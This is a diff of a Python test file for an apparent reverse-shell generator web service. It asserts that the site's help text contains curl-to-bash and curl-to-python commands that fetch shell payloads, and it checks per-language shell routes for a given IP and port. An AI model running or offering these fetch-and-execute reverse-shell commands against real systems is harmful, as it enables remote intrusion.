@@ -11,17 +11,18 @@ def test_home(app, client):
 	assert b"* Basic Usage:" in response.data
 	assert b"curl rshell.sh/10.0.0.1/1234 | bash" in response.data
 	assert b"* Different Languages:" in response.data
-	assert b"curl rshell.sh/python/10.0.0.1/1234 | python" in response.data
+	assert b"curl rshell.sh/10.0.0.1/1234/?lang=python | python" in response.data
 	assert b"* Quote Wrapped:" in response.data
-	assert b"curl rshell.sh/10.0.0.1/1234?q=y | xargs bash -c" in response.data
-	assert b"Help Page" in response.data
+	assert b"curl rshell.sh/10.0.0.1/1234?quotes=single | xargs bash -c" in response.data
+	assert b"Web & Term Friendly Help Page" in response.data
 	assert b"curl rshell.sh/help" in response.data
 	assert b"* JSON API:" in response.data
-	assert b"No Use 4 Bad Hax!!!" in response.data
+	assert b"Plz No Use 4 Bad Hax!!!" in response.data
 
 	# POST Request tests.
 	response = client.post('/', data=dict(test=''))
 	assert response.status_code == 405	# Return's 405 to POST requests.
+
 
 # Test help page html.
 def test_help(app, client):
@@ -43,7 +44,7 @@ def test_help(app, client):
 	assert b"host" in response.data
 	assert b"port" in response.data
 	assert b"lang" in response.data
-	assert b"Tips" in response.data
+	assert b"Extras" in response.data
 	assert b"Python Shell Reset" in response.data
 	assert b"curl -s rshell.sh/reset" in response.data
 	assert b"Command Line Friendly Help Menu" in response.data
@@ -54,6 +55,7 @@ def test_help(app, client):
 	# POST Request tests.
 	response = client.post('/', data=dict(test=''))
 	assert response.status_code == 405	# Return's 405 to POST requests.
+
 
 # Test stabilize / reset page html.
 def test_stabilize(app, client):
@@ -68,58 +70,60 @@ def test_stabilize(app, client):
 	response = client.post('/reset', data=dict(test=''))
 	assert response.status_code == 405	# Return's 405 to POST requests.
 
-# Testing bash page.
+
+# Testing bash.
 def test_bash(app, client):
 	# GET Request tests.
-	response = client.get('/bash/127.0.0.1/12345')
+	response = client.get('/127.0.0.1/12345/?lang=bash')
+	assert response.status_code == 200	# Return's 200 to GET requests.
+
+	response = client.get('/127.0.0.1/12345?lang=bash')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
 	response = client.get('/127.0.0.1/12345')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
 	# POST Request tests.
-	response = client.post('/bash/127.0.0.1/12345', data=dict(test=''))
+	response = client.post('/127.0.0.1/12345/?lang=bash', data=dict(test=''))
 	assert response.status_code == 405	# Return's 405 to POST requests.
 
-# Testing python page.
+	response = client.post('/127.0.0.1/12345?lang=bash', data=dict(test=''))
+	assert response.status_code == 405	# Return's 405 to POST requests.
+
+
+# Testing python.
 def test_python(app, client):
 	# GET Request tests.
-	response = client.get('/python/127.0.0.1/12345')
+	response = client.get('/127.0.0.1/12345/?lang=python3')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
-	response = client.get('/python3/127.0.0.1/12345')
+	response = client.get('/127.0.0.1/12345?lang=python')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
-	# POST Request tests.
-	response = client.post('/python/127.0.0.1/12345', data=dict(test=''))
-	assert response.status_code == 405	# Return's 405 to POST requests.
 
-# Testing perl page.
+# Testing perl.
 def test_perl(app, client):
 	# GET Request tests.
-	response = client.get('/perl/127.0.0.1/12345')
+	response = client.get('/127.0.0.1/12345/?lang=perl')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
-	# POST Request tests.
-	response = client.post('/perl/127.0.0.1/12345', data=dict(test=''))
-	assert response.status_code == 405	# Return's 405 to POST requests.
+	response = client.get('/127.0.0.1/12345?lang=perl')
+	assert response.status_code == 200	# Return's 200 to GET requests.
 
-# Testing php page.
+# Testing php.
 def test_php(app, client):
 	# GET Request tests.
-	response = client.get('/php/127.0.0.1/12345')
+	response = client.get('/127.0.0.1/12345/?lang=php')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
-	# POST Request tests.
-	response = client.post('/php/127.0.0.1/12345', data=dict(test=''))
-	assert response.status_code == 405	# Return's 405 to POST requests.
+	response = client.get('/127.0.0.1/12345?lang=php')
+	assert response.status_code == 200	# Return's 200 to GET requests.
 
-# Testing awk page.
+# Testing awk.
 def test_awk(app, client):
 	# GET Request tests.
-	response = client.get('/awk/127.0.0.1/12345')
+	response = client.get('/127.0.0.1/12345/?lang=awk')
 	assert response.status_code == 200	# Return's 200 to GET requests.
 
-	# POST Request tests.
-	response = client.post('/awk/127.0.0.1/12345', data=dict(test=''))
-	assert response.status_code == 405	# Return's 405 to POST requests.
+	response = client.get('/127.0.0.1/12345?lang=awk')
+	assert response.status_code == 200	# Return's 200 to GET requests.
